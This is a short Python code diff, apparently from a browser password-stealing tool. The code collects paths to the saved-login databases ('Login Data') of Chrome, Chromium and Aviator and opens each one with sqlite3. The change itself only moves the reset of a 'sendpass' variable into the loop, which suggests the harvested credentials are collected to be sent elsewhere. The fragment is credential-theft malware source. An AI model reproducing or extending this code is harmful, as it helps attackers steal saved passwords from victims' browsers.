@@ -18,7 +18,6 @@ try:
 except:
 	pass
 
-sendpass = ''
 appdata = getenv("APPDATA")
 paths = []
 paths.append(appdata + "%s..%sLocal%sGoogle%sChrome%sUser Data%sDefault%sLogin Data" % (sep,sep,sep,sep,sep,sep,sep))  # Chrome
@@ -26,6 +25,7 @@ paths.append(appdata + "%s..%sLocal%sChromium%sUser Data%sDefault%sLogin Data" %
 paths.append(appdata + "%s..%sLocal%sAviator%sUser Data%sDefault%sLogin Data" % (sep,sep,sep,sep,sep,sep))             # Aviator
 
 for passpath in paths:
+	sendpass = ''
 	try:
 		connection = sqlite3.connect(passpath)
 		cursor = connection.cursor()
